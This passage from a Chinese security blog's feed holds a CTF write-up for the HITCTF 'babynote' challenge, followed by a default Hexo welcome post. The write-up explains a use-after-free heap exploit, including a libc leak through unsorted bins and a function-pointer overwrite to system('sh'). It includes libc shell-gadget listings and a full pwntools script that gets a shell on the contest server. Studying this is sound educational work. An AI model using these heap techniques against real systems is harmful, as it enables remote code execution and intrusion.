NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x3ac5e execve("/bin/sh", esp+0x2c, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp+0x2c] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x3ac62 execve("/bin/sh", esp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x3ac69 execve("/bin/sh", esp+0x34, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp+0x34] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5fbc5 execl("/bin/sh", eax)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  eax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5fbc6 execl("/bin/sh", [esp])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="babynote"><a href="#babynote" class="headerlink" title="babynote"></a>babynote</h1><p>一道比较典型的UAF漏洞。</p><h2 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h2><p>程序逻辑是一个可以任意输入的note，每一个note分为了两部分：block和content</p><p>block的结构为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  size（int）    |      content address    |    function ptr    | </span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>content的大小为size值</p><p>add函数中详细的为每一个变量赋值，尤其是function ptr，初始值为某自实现的puts函数</p><p><img src="/img/HITCTF/pwn_5_2.png" alt=""></p><p>print函数中显示了调用function ptr函数的参数和方法，可以想到如果可以劫持function ptr就可以执行任意命令</p><p><img src="/img/HITCTF/pwn_5_3.png" alt=""></p><p>在程序中要求最多可以生成3个note，分别存储在bss段上的一个数组内</p><p><img src="/img/HITCTF/pwn_5_1.png" alt=""></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>显然，由于在edit的时候并没有检查堆块是否已经被释放，因此，存在明显的UAF(Use After Free)漏洞。</p><p>而且删除堆块时程序的释放顺序是先释放content，再释放block，由于fastbin的LIFO性质，可以明显知道</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add（0xc，&apos;p4nda&apos;）</span><br><span class="line">delete(0)</span><br><span class="line">add(0xc,&apos;p4nda&apos;)</span><br></pre></td></tr></table></figure><p>使用的堆块是不变的，因此想要用分配得到的content控制一个note的block，进而控制function ptr的方法必须让堆块分配不平衡。</p><p>比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(0x100,&apos;p4nda&apos;)</span><br><span class="line">add(0xc,&apos;p4nda&apos;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">add(0xc,payload)</span><br></pre></td></tr></table></figure><p>这样分配，可以导致第0个note的block分配给第2个note的block，而第1个note的block会分配给第二个note作为content，是可以编辑的，进一步可以劫持控制流。</p><h2 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h2><p>此题开启了PIE保护，不可以使用题目文件中的固定地址了。同时需要利用获取system地址，来得到shell，因此泄露一个libc地址是很必要的。</p><p>这时存在一个堆块分配与释放的机制问题，堆块在libc的内存管理中主要分fastbin、unsorted bin、 small bin、large bin、top、mmap来管理，其中fastbin管理的是较小堆块，当内存小于global_max_fast值时，在内存释放时会挂载到fastbin中，而稍大一些的small bin、large bin在释放时，当不与top头相邻，会先挂载到unsorted bin中去。</p><p>而如何寻找到各个bin的地址？libc在bss段上设置了一个结构体变量叫 main_arena，变量的各个成员就是每个bin的开头，如图</p><p><img src="/img/HITCTF/pwn_5_5.png" alt=""></p><p>在libc符号表中，没有main<em>arena的符号，但该地址与\</em>_malloc<em>hook很近，通常利用 \</em>_mall_hook来定位main_arena</p><p><img src="/img/HITCTF/pwn_5_6.png" alt=""></p><p>在各个bin链表中，不同的链表有不同的组织方式，如fastbin是单链表，unsorted bin、small bin是双链表，largebin更为复杂。因此，常用的地址泄露的方式是从unsorted bin泄露，当可以任意读取unsorted bin数据时，堆块的fd位置即为main_arena中unsorted bin地址。</p><p>如在此题中就可以用这种方式泄露</p><p><img src="/img/HITCTF/pwn_5_7.png" alt=""></p><h2 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(0x100,&apos;p4nda&apos;)</span><br><span class="line">add(0xc,&apos;p4nda&apos;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">add(0xc,payload)</span><br></pre></td></tr></table></figure><p>当按上述方法控制了第1块的block时，修改payload即可完成对控制流的劫持，如利用泄露的libc地址获取system()地址，将其覆盖到function ptr时，在将size覆盖成 sh\x00\x00，利用print(1)进行触发即可获得一个shell</p><pre><code>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| &apos;sh\0\0&apos;    |     anything     |    system address    | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><p>利用脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./babynote'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./babynote'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40004</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'p4nda'</span>)</span><br><span class="line">add(<span class="number">0xc</span>,<span class="string">'p4nda'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line">libc_leak_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc.address = libc_leak_addr - libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-48</span><span class="number">-0x18</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="number">0xc</span>,<span class="string">'sh\0\0'</span>+p32(next(libc.search(<span class="string">'/bin/sh'</span>)))+p32(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">print_note(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="/img/HITCTF/HITCTF.zip">题目</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;HITCTF是哈尔滨工业大学组织的一场校赛，在假期时间看了一下题目，锻炼一下，以此记录。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/HITCTF/logo.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;本次比赛共有五道PWN题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;stackoverfl
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://p4nda.top/2018/01/23/hello-world/"/>
    <id>http://p4nda.top/2018/01/23/hello-world/</id>
    <published>2018-01-22T16:34:14.000Z</published>
    <updated>2018-01-24T13:04:46.446Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
      <category term="hello" scheme="http://p4nda.top/tags/hello/"/>
    
      <category term="world" scheme="http://p4nda.top/tags/world/"/>
    
  </entry>
  
</feed>
